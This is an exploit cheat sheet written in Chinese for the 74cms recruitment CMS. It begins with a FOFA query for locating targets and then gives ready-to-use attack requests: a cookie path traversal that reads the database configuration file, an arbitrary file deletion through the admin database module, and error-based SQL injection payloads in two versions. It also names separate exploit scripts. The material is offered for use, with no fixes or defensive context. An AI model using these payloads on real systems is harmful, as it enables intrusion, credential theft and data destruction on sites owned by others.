# FOFA语法：app="74cms"



# 74cms v4.2.126-任意文件读取漏洞

```
url: http://74cms.test/index.php?m=Home&c=Members&a=register

post: 
reg_type=2&utype=2&org=bind&ucenter=bind
cookie: members_bind_info[temp_avatar]=../../../../Application/Common/Conf/db.php;members_bind_info[type]=qq;members_uc_info[password]=123456;members_uc_info[uid]=1;members_uc_info[username]=tttttt;
headers:
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
```

综合利用脚本见**74cms_file_read.php**



# 74cms v4.2.3 任意文件删除

``` 
GET /index.php?m=admin&c=database&a=del&name=/../../../../../ HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1/index.php?m=admin&c=database&a=restore
Connection: close
Cookie: think_template=default; PHPSESSID=6d86a34ec9125b2d08ebbb7630838682; think_language=en
Upgrade-Insecure-Requests: 1
```

poc为`?m=admin&c=database&a=del&name=/../../../../../`



# **74cms v4.2.3** **备份文件爆破**

利用脚本见**74cms_bak_instruct.py**



# **74cms v4.2.126-**通杀**sql**注入

Payload:

`http://xx.xx/index.php?m=&c=jobs&a=jobs_list&lat=23.176465&range=20&lng=113.35038 PI() / 180 - map_x  PI() / 180) / 2),2))) * 1000) AS map_range FROM qs_jobs_search j WHERE (extractvalue (1,concat(0x7e,(SELECT USER()), 0x7e))) -- a`



# **74cms v5.0.1** **前台sql**注入

### **具体信息**

文件位置：74cms\upload\Application\Home\Controller\AjaxPersonalController.class.php

方法：function company_focus($company_id)

是否需登录：需要

登录权限：普通用户即可

### **Payload:**

`http://xx.xx/74cms/5.0.1/upload/index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=aaaaaaa%22) and updatexml(1,concat(0x7e,(select user())),0) -- a`

